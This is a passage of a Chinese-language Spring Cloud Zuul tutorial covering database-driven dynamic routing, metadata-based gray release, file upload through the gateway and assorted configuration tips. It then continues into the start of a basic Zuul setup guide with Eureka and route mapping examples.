包中，主要目的是注册各种过滤器、监听器以及其他功能。Zuul 在注册中心新增服务后刷新监听器也是在此注册的，底层是采用 Spring 的 ApplicationListener 来实现。由方法 onApplicationEvent(ApplicationEvent event) 可知，Zuul 会接收 3 种事件通知（ContextRefreshedEvent、RefreshScopeRefreshedEvent、RoutesRefreshedEvent）去刷新路由映射配置信息，此外心跳续约监视器 HeartbeatMonitor 也会触发这个动作。 ZuulHandlerMapping 此类是将本地配置的映射关系映射到远程的过程控制器，与事件刷新相关的代码。类里的 dirty 属性很重要，它是用来控制当前是否需要重新加载映射配置信息的标记，在 Zuul 每次进行路由操作的时候都会检査这个值，如果为 true，就会触发配置信息的重新加载，同时再将其回设为 false。由 setDirty(boolean dirty) 可知，启动刷新动作必须要实现 RefreshableRouteLocator 接口。 原理总结 在构建动态路由的时候，只需要重写 SimpleRouteLocator 类的 locateRoutes() 方法，并且实现 RefreshableRouteLocator 接口的 refresh() 方法，再在内部调用 SimpleRouteLocator 类的 doRefresh() 方法，就可以构建起一个由 Zuul 内部事件触发的自定义动态路由加载器。如果不想使用内部事件触发配置更新操作，改为手动触发，可以重写 onApplicationEvent(ApplicationEvent event) 方法，事实上手动触发的控制性更好。 基于 DB 的动态路由实战下面做一个实战例子，这里的 DB 暂且选用 MySQL，当然也可以选择其他持久化方式，目的是方便，易于管理，实际上选用 MongoDB 也是一种不错的选择，点击下载完整的示例代码。 存储映射规则的数据库表设计： zuul-server 的 pom.xml 文件： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt; zuul-server 的 application.yml 文件，如果需要防止服务侵入，这里可以将 ribbon.eureka.enabled 设置为 false： 12345678910111213141516171819202122server: port: 8092spring: application: name: zuul-server datasource: url: jdbc:mysql://localhost:3306/zuul-test?useUnicode=true&amp;characterEncoding=utf-8 driver-class-name: com.mysql.jdbc.Driver username: root password: 123456eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: trueribbon: eureka: enabled: true 在 zuul-server 里编写 DAO 类，从数据库读取路由配置信息： 12345678910111213141516171819202122@Componentpublic class PropertiesDao { @Autowired private JdbcTemplate jdbcTemplate; private final static String SQL = "SELECT * FROM zuul_route WHERE enabled = TRUE"; public Map&lt;String, ZuulProperties.ZuulRoute&gt; getProperties() { Map&lt;String, ZuulProperties.ZuulRoute&gt; routes = new LinkedHashMap&lt;&gt;(); List&lt;ZuulRouteEntity&gt; list = jdbcTemplate.query(SQL, new BeanPropertyRowMapper&lt;&gt;(ZuulRouteEntity.class)); list.forEach(entity -&gt; { if (StringUtils.isEmpty(entity.getPath())) { return; } ZuulProperties.ZuulRoute zuulRoute = new ZuulProperties.ZuulRoute(); BeanUtils.copyProperties(entity, zuulRoute); routes.put(zuulRoute.getPath(), zuulRoute); }); return routes; }} 在 zuul-server 里编写自定义路由配置加载器类，该类是改造的核心类，locateRoutes() 方法从数据库加载配置信息，并且配合 Zuul 内部事件刷新机制，实际上每次心跳续约都会触发路由配置重新加载的操作，如果需要改为手动触发，可参考上面的动态路由实现原理剖析： 12345678910111213141516171819202122232425262728293031323334353637383940public class DynamicZuulRouteLocator extends SimpleRouteLocator implements RefreshableRouteLocator { @Autowired private ZuulProperties properties; @Autowired private PropertiesDao propertiesDao; public DynamicZuulRouteLocator(String servletPath, ZuulProperties properties) { super(servletPath, properties); this.properties = properties; } @Override public void refresh() { doRefresh(); } @Override protected Map&lt;String, ZuulRoute&gt; locateRoutes() { LinkedHashMap&lt;String, ZuulRoute&gt; routesMap = new LinkedHashMap&lt;&gt;(); routesMap.putAll(super.locateRoutes()); routesMap.putAll(propertiesDao.getProperties()); LinkedHashMap&lt;String, ZuulRoute&gt; values = new LinkedHashMap&lt;&gt;(); routesMap.forEach((key, value) -&gt; { String path = key; if (!path.startsWith("/")) { path = "/" + path; } if (StringUtils.hasText(this.properties.getPrefix())) { path = this.properties.getPrefix() + path; if (!path.startsWith("/")) { path = "/" + path; } } values.put(path, value); }); return values; }} 在 zuul-server 编写配置类，让上面的自定义路由配置加载器生效： 123456789101112131415@Configurationpublic class DynamicZuulConfig { @Autowired private ZuulProperties zuulProperties; @Autowired private ServerProperties serverProperties; @Bean public DynamicZuulRouteLocator routeLocator() { DynamicZuulRouteLocator routeLocator = new DynamicZuulRouteLocator(serverProperties.getServlet().getServletPrefix(), zuulProperties); return routeLocator; }} 测试效果： 依次启动 eureka-server、provider-service、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，查看接口调用的结果 访问 http://127.0.0.1:8092/provider-service/provider/add?b=3，查看接口调用的结果 访问 http://127.0.0.1:8092/baidu，查看是否跳转到百度的首页 Zuul 灰度发布灰度发布概述灰度发布，是指在系统迭代新功能时的一种平滑过渡的上线发布方式。灰度发布是在原有系统的基础上，额外增加一个新版本，这个新版本包含需要待验证的新功能，随后用负载均衡器引入一小部分流量到这个新版本应用，如果整个过程没有出现任何差错，再平滑地把线上系统或服务一步步替换成新版本，至此完成了一次灰度发布。这种发布方式由于可以在用户无感知的情况下完成产品的升级，在许多公司都有较为成熟的解决方案。对于 Spring Cloud 微服务生态来说，粒度一般是一个服务，往往通过使用某些带有特定标记的流量来充当灰度发布过程中的 “小白鼠”，并且目前已经有比较好的开源项目来做这个事情。 灰度发布实战灰度发布有很多种实现方式，这里要讲的是基于 Eureka 元数据（metadata）的一种方式，它的原理是通过获取 Eureka 实例信息，并鉴别元数据的含义，再分别进行路由规则下的负载均衡，点击下载完整的示例代码。 其中在 Eureka 里面，一共有两种元数据： 标准元数据：这种元数据是服务的各种注册信息，比如 IP、端口、服务健康信息、续约信息等，存储于专门为服务开辟的注册表中，用于其他组件取用以实现整个微服务生态 自定义元数据：自定义元数据是使用 eureka.instance.metadata-map.&lt;key&gt;=&lt;value&gt; 来配置的，其内部其实就是维护了一个 Map 来保存自定义元数据信息，可以配置在服务提供者端，随服务一并注册保存在 Eureka 的注册表中，对微服务生态的任何行为都没有影响，除非知道其特定的含义 首先编写 provider-service、provider-service-2、provider-service-3 应用，9090 与 9091 端口运行的是稳定的线上服务，将它们的 host-mark 设置成 running-host，需要上线的灰度服务的端口为 9092，host-mark 为 gray-host，最后要达成的效果是：由于服务名称都为 provider-service，但是在某一个值的作用下，部分请求被分发到 9090 与 9091 实例上，也就是 host-mark 为 running-host 的节点；另一部分则分发到 9092 实例，host-mark 为 gray-host 的节点。 provider-service 的 application.yml 文件： 123456789101112131415server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: running-host provider-service-2 的 application.yml 文件： 123456789101112131415server: port: 9091spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: running-host provider-service-3 的 application.yml 文件： 123456789101112131415server: port: 9092spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: gray-host 在 zuul-server 中的 pom.xml 文件里，引入开源项目 ribbon-discovery-filter-spring-cloud-starter，该项目提供了一种基于 metadata 的负载均衡机制： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.jmnarloch&lt;/groupId&gt; &lt;artifactId&gt;ribbon-discovery-filter-spring-cloud-starter&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt; 在 zuul-server 里创建自定义的过滤器，此过滤器的作用是将 header 里面的 gray-mark 作为指标，如果 gray-mark 等于 enable 的话，就将该请求路由到灰度节点 gray-host，如果不等于或者没有这个指标就路由到其他节点。RibbonFilterContextHolder 是该项目的一个核心类，它定义了基于 metadata 的一种负载均衡机制 123456789101112131415161718192021222324252627282930public class GrayPublishFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER - 1; } @Override public boolean shouldFilter() { RequestContext ctx = RequestContext.getCurrentContext(); return !ctx.containsKey(FORWARD_TO_KEY) &amp;&amp; !ctx.containsKey(SERVICE_ID_KEY); } @Override public Object run() throws ZuulException { HttpServletRequest request = RequestContext.getCurrentContext().getRequest(); String mark = request.getHeader("gray-mark"); if (!StringUtils.isEmpty(mark) &amp;&amp; "enable".equals(mark)) { RibbonFilterContextHolder.getCurrentContext().add("host-mark", "gray-host"); } else { RibbonFilterContextHolder.getCurrentContext().add("host-mark", "running-host"); } return null; }} 在 zuul-server 里创建配置类： 12345678@Configurationpublic class CommonConfiguration { @Bean public GrayPublishFilter grayPublishFilter() { return new GrayPublishFilter(); }} 在 zuul-server 里创建启动主类： 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} 测试效果： 依次启动 eureka-server、provider-service、provider-service-2、provider-service-3、zuul-server 应用 header 不加 gray-mark=enable，访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，请求只会路由到 9090 与 9091 端口的 provider-service 服务上（默认轮询） header 加上 gray-mark=enable，访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，无论请求多少次，请求都会路由到 9092 端口的 provider-service 服务上 Zuul 文件上传文件上传的场景，很多开发者都会遇到，Zuul 作为一个网关中间件，自然也会面临文件上传的考验。Zuul 的文件上传功能是从 Spring Boot 承袭过来的，所以也需要 Spring Boot 的相关配置，点击下载完整的示例代码。 文件上传实战zuul-server 的 pom.xml 文件，为了上传测试方便，另外引入了 Swagger2： 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; zuul-server 的 application.yml 文件： 12345678910111213141516171819202122232425262728293031323334353637383940server: port: 8092spring: application: name: zuul-server servlet: multipart: enabled: true #使用http multipart上传处理 max-file-size: 100MB #设置单个文件的最大长度，默认1M，如不限制配置为-1 max-request-size: 100MB #设置最大的请求文件的大小，默认10M，如不限制配置为-1 file-size-threshold: 1MB #当上传文件达到1MB的时候进行磁盘写入 location: /tmp #上传的临时目录eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-service##### 设置Ribbon的超时时间，如果要上传大文件，为避免超时，稍微设大一点ribbon: ConnectTimeout: 3000 ReadTimeout: 30000##### Hystrix默认超时时间为1秒，如果要上传大文件，为避免超时，稍微设大一点hystrix: command: default: execution: isolation: thread: timeoutInMilliseconds: 30000 在 zuul-server 里编写 Swagger2 的配置类： 123456789101112131415161718@Configuration@EnableSwagger2public class Swagger2Config { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo()).select() .apis(RequestHandlerSelectors.basePackage("com.springcloud.study.controller")) .paths(PathSelectors.any()).build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Zuul文件上传") .description("Zuul文件上传") .version("1.0").build(); }} 在 zuul-server 里编写文件上传的测试类： 12345678910111213141516171819@RestController@Api("Zuul文件上传")public class UploadController { public static final String PREFIX_PATH = "/tmp/upload/"; private static final Logger logger = LoggerFactory.getLogger(UploadController.class); @PostMapping("/upload") @ApiOperation("文件上传接口") public String upload(@RequestParam(value = "file", required = true) MultipartFile file) throws Exception { logger.info("==&gt; file size: " + file.getSize()); byte[] bytes = file.getBytes(); String filePath = PREFIX_PATH + UUID.randomUUID().toString(); File fileToSave = new File(filePath); FileCopyUtils.copy(bytes, fileToSave); return filePath; }} 测试效果： 依次启动 eureka-server、zuul-server 应用 访问 http://127.0.0.1:8092/swagger-ui.html，选择本地文件进行上传即可 文件上传乱码在 Spring Cloud Finchley 之前的版本，上传中文名的文件会出现文件名乱码的情况，上传英文名的文件则不会，这是由于 Zuul 内部默认使用了 Spring MVC 来上传文件，这种方式对中文字符的处理有点不友好。如果要解决这个问题，可以改为使用 Zuul Servlet 来上传文件，当需要上传大文件的时候尤需如此，因为它自带有一个缓冲区。此时只需要在请求路径前加上 /zuul 就可以使用 Zuul Servlet 了，例如：http://127.0.0.1:8092/zuul/upload。 Zuul 实用技巧饥饿加载Zuul 内部默认使用 Ribbon 来调用远程服务，所以由于 Ribbon 的原因，在部署好所有应用组件之后，第一次经过 Zuul 的调用往往会去注册中心读取服务注册表，初始化 Ribbon 负载均衡信息，这是一种懒加载策略，但是这个过程是极其耗时的，尤其是服务过多的时候。为了避免这个问题，可以在启动 Zuul 的时候就饥饿加载应用程序上下文信息；开启饥饿加载只需添加以下配置即可： 1234zuul: ribbon: eager-load: enabled: true 请求体修改在客户端对 Zuul 发送 POST 请求之后，由于某些原因，在请求到下游服务之前，需要对请求体进行修改，常见的是对 form・data 参数的增减，对 application/json 的修改，对请求体做 Uppercase 等。在 Zuul 中可以很好地解决这种需求，只需要新增一个 PRE 类型的 Filter 对请求体进行修改。由于在 Zuul 中有 Filter (FormBodyWrapperFilter) 会对请求体做封装，因此在编写此 Filter 的时候应当把它的执行次序放在该 Filter 之后，为了稳妥起见，把 ModifyRequestEntityFilter 的次序设置为 PRE 类型 Filter 的最后一级。 12345678910111213141516171819202122232425262728293031323334public class ModifyRequestEntityFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER + 1; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { RequestContext ctx = RequestContext.getCurrentContext(); HttpServletRequest request = ctx.getRequest(); request.getParameterMap(); Map&lt;String, List&lt;String&gt;&gt; requestQueryParams = ctx.getRequestQueryParams(); if (requestQueryParams == null){ requestQueryParams = new HashMap&lt;&gt;(); } //这里添加新增参数的value，注意，只取list的0位 ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;(); arrayList.add("wwww"); requestQueryParams.put("test", arrayList); ctx.setRequestQueryParams(requestQueryParams); return null; }} 重试机制在 Spring Cloud 中有多种发送 HTTP 请求的方式可以与 Zuul 结合，RestTemplate、Ribbon 或者 Feign，但是无论选择哪种，都可能出现请求失败的情况，这在复杂的互联网环境是不可避免的。Zuul 作为一个网关中间件，在出现偶然请求失败时进行适当的重试是十分必要的，重试可以有效地避免一些突发原因引起的请求丢失。Zuul 中的重试机制是配合 Spring Retry 与 Ribbon 来使用的。 在 pom.xml 引入 Spring Retry 的依赖包： 1234&lt;dependency&gt; &lt;groupld&gt;org.springframework.retry&lt;/groupld&gt; &lt;artifactld&gt;spring-retry&lt;/artifactld&gt;&lt;/dependency&gt; 在 application.yml 里添加重试相关的配置内容： 123456789101112131415161718#Zuul开启重试，D版之后默认为false，需要手动开启zuul: retryable: true#Ribbon的重试机制配置ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #对第一次请求的服务的重试次数 MaxAutoRetriesNextServer: 1 #要重试的下一个服务的最大数量（不包括第一个服务） OkToRetryOnAllOperations: true#SpringCloud内部默认已开启负载均衡重试，这里列出来说明这个参数比较重要spring: cloud: loadbalancer: retry: enabled: true 配置当中的 ConnectTimeout 与 ReadTimeou 是当 HTTP 客户端使用 Apache HttpClient 的时候生效的，这个超时时间最终会被设置到 Apache HttpClient 中去。在设置的时候要结合 Hystrix 的超时时间来综合考虑，针对不同的应用场景，设置太小会导致很多请求失败，设置太大会导致熔断功能控制性变差，所以需要经过压力测试得来。Zuul 同时也支持对单个映射规则进行重试 zuul.routes.&lt;route&gt;.retryable=true，需要注意的是，在某些对幂等要求比较高的使用场景下，要慎用重试机制，因为如果没有相关处理的话，出现幂等问题是十分有可能的。 Header 传递在 Zuul 中对请求做了一些处理，需要把处理结果发给下游服务，但是又不能影响请求体的原始特性，这个问题该怎么解决好呢？Zuul 提供了一个重要的类 Requestcontext，里面的 addZuulRequestHeader() 方法正好可以用来解决此问题，官方称之为 Header 的传递。 123456789101112131415161718192021222324public class HeaderDeliverFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER + 1; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { RequestContext context = RequestContext.getCurrentContext(); context.addZuulRequestHeader("result", "to next service"); return null; }} 使用 OkHttp 替换 Apache HttpClient在 Spring Cloud 中各个组件之间使用的通信协议都是 HTTP，而 HTTP 客户端使用的是 Apache HttpClient，但是由于其难以扩展等诸多原因，已被许多技术栈弃用。 Square 公司开发的 okhttp 正在逐渐被接受，在 Zuul 中使用 okhttp 替换 Apache HttpClient，首先需要在 pom.xml 中增加 okhttp 的依赖包： 1234&lt;dependency&gt; &lt;groupld&gt;com.squareup.okhttp3&lt;/groupld&gt; &lt;artifactId&gt;okhttp&lt;/artifactId&gt;&lt;/dependency&gt; 然后在 application.yml 文件中禁用 HttpClient 并开启 okhttp 即可： 12345ribbon: httpclient: enabled: false okhttp: enabled: true 下篇 - Zuul 入门教程（高级篇） Zuul 入门教程 - 高级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Zuul 入门教程 - 基础篇",url:"/posts/316633c.html",text:'Zuul 介绍Zuul 是什么Zuul 是由 Netflix 孵化的一个致力于 “网关” 解决方案的开源组件，在动态路由、监控、弹性、服务治理以及安全方面起着举足轻重的作用。从 2012 年 3 月以来，陆续发布了 Zuul 1.0 与 Zuul 2.0 版本，后经 Pivotal 公司将 Zuul 1.0 整合到 Spring Cloud 的生态系统中，即现在的 Spring Cloud Zuul。在 Netflix 官方的解释中，Zuul 是从设备和网站到后端应用程序所有请求的前门，为内部服务提供可配置的对外 URL 到服务的映射关系，基于 JVM 的后端路由器。其底层基于 Servlet 实现，本质组件是一系列 Filter 所构成的责任链，并且 Zuul 的逻辑引擎与 Filter 可用其他基于 JVM 的编程语言编写（比如 Groovy）。Zuul 默认集成了 Ribbon、Hystrix，其中 Zuul 2.x 版本改动相较 1.x 比较大，底层使用了 Netty。虽然 Netflix 已经在 2018 年 5 月开源了 Zuul 2.x，但由于 Zuul 2.x 在 Spring Cloud Gateway 孵化之前一直跳票发布，而且 Spring Cloud Gateway 目前已经孵化成功，相较于 Zuul 1.x 在功能以及性能上都有明显的提升。因此在 Spring Boot 2.0 以上版本中，并没有对 Zuul 2.0 以上最新高性能版本进行集成，仍然使用 Zuul 1.x 非 Reactor 模式（基于 Servlet 2.5 阻塞架构）的旧版本。更多介绍可参考：Zuul 项目、Zuul 官方英文教程、Spring Cloud Zuul 官方中文文档 Zuul 的特性主要特性包括：认证和鉴权、压力控制、动态路由、负载削减、静态响应处理、主动流量管理、金丝雀测试 Zuul 1.x 与 Zuul 2.x 对比Zuul 1.x 是一个基于 Servlet 2.5 的同步阻塞 I/O 网关，不支持任何长连接（如 WebSocket）。Zuul 1.x 的设计和 Nginx 比较像，每次 I/O 操作都是从工作线程池中选择一个来执行，请求线程被阻塞到工作线程完成为止；但是差别是 Nginx 是基于 C/C++ 实现，而 Zuul 1.x 是使用 Java 实现，而 JVM 本身会有第一次加载较慢的情况，使得 Zuul 1.x 的性能相对较差。根据官方提供的基准测试，Spring Cloud Gateway 的 RPS（每秒请求数）是 Zuul 1.x 的 1.6 倍，平均延迟是 Zuul 1.x 的一半。 Zuul 2.x 的理念更先进，基于 Netty 的异步非阻塞 I/O 模型，支持长连接。Zuul 2.x 最大的改进就是基于 Netty Server 实现了异步非阻塞 I/O 来接入请求，同时基于 Netty Client 实现了到后端业务服务 API 的请求，这样就可以实现更高的性能、更低的延迟。此外也调整了 Filter 类型，将原来的三个核心 Filter 显式命名为：Inbound Filter、Endpoint Filter 和 Outbound Filter。值得一提的是，Zuul 2.x 与 Spring Cloud Gateway 的性能差不多。Zuul 2.x 的核心功能如下： GZip HTTP/2 Retries Mutual TLS WebSocket/SSE Proxy Protocol Load Balancing Request Passport Request Attempts Status Categories Service Discovery Connection Pooling Origin Concurrency Protection Zuul 入门案例这里的案例将使用到的 Spring Cloud 组件是 Eureka 与 Zuul，另外再使用一个普通服务作为 Zuul 路由的下级服务，来模拟真实开发中的一次路由过程。 1. 版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，Zuul 版本是 1.x，点击下载完整的案例代码 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 下游服务工程创建 Provider 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableDiscoveryClient，将服务注册到 Eureka Server： 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider-service）、注册中心地址与端口号： 12345678910111213server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. 创建 Zuul Server 工程创建 Zuul Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-client、spring-cloud-starter-netflix-zuul 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Zuul Server 的启动主类，添加注解 @EnableZuulProxy、@EnableDiscoveryClient 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} 在 application.yml 文件中指定服务名称（zuul-server）、注册中心地址与端口号： 1234567891011121314151617181920server: port: 8092spring: application: name: zuul-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true#路由映射规则zuul: routes: provider-service: path: /provider/service/** serviceId: provider-service 6. 测试效果 分别启动 eureka-server、provider-service、zuul-server 应用 访问 provider-service 应用：http://127.0.0.1:9090/provider/add?a=3&amp;b=5 方式一：通过 zuul-server 访问 provider-service 应用：http://127.0.0.1:8092/provider-service/provider/add?a=3&amp;b=5，provider-service 为服务实例的名称 方式二：通过 zuul-server 访问 provider-service 应用：http://127.0.0.1:8092/provider/service/provider/add?a=3&amp;b=6，这里使用了路由映射规则 /provider/service/** 若上面通过 zuul-server 访问 provider-service 应用后，都可以正常返回结果，则说明 Zuul 成功发挥了网关的作用提示：若在 Zuul 的配置文件中指定了路由映射规则，当向 Zuul Server 发起请求的时候，Zuul 会去 Eureka 注册中心拉取服务列表，如果发现有指定的路由映射规则，就会按照映射规则路由到相应的服务接口 Zuul 路由配置路由配置简化12345zuul: routes: client-a: path: /client/** serviceId: client-a 上述的配置中，是一个从 /client/** 路由到 client-a 服务的一个映射规则，它可以简化成如下的简单配置，在这种情况下，Zull 会为 client-a 服务添加一个默认的映射规则 /client/** 123zuul: routes: client-a: /client/** 单实例 URL 映射除了路由到服务外，还支持路由到物理笛子，将 serviceId 替换为 url 即可： 12345zuul: routes: client-a: path: /client/** serviceId: http://127.0.0.1:8080 多实例路由映射在默认情况下，Zuul 会使用 Eureka 中集成的负载均衡功能，如果想要使用 Ribbon 的客户端负载均衡功能，就需要指定一个 serviceId，此操作需要禁止 Ribbon 使用 Eureka。提示：Spring Cloud 在 E 版本之后，新增了负载均衡策略的配置： 123456789101112131415zuul: routes: client-a: path: /ribbon/** serviceId: client-aribbon: eureka: enabled: falseclient-a: ribbon: NIWSServerListClassName: com.netflix.loadbalancer.ConfigurationBasedServerList NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule listOfServers: 127.0.0.1:8001,127.0.0.1:8002 Forward 本地跳转在 Zuul 中有时候会做一些逻辑处理，先在网关（Zuul Server）中写好一个接口，如下： 12345678@RestControllerpublic class TestController { @GetMapping("/add") public String add(Integer a, Integer b){ return "本地跳转: " + (a + b); }} 如果希望在访问 /provider/service 接口的时候，跳转到上面的 add 方法上来处理，就需要用到 Zuul 的本地跳转，配置如下： 12345zuul: routes: provider-service: path: /provider/service/** url: forward:/add 当访问 http://127.0.0.1:8092/provider/service?a=2&amp;b=3，会跳转到 TestController 类的 add 本地方法 相同路径的加载规则有一种特殊的情况，为一个映射路径指定多个 serviceId 时，那么 Zuul 总是会路由到 YML 配置文件中最后面的那个服务。即在 YML 解释器工作的时候，如果同一个映射路径对应多个服务，按照加载顺序，最后加载的映射规则会把之前的映射规则覆盖掉。 12345678zuul: 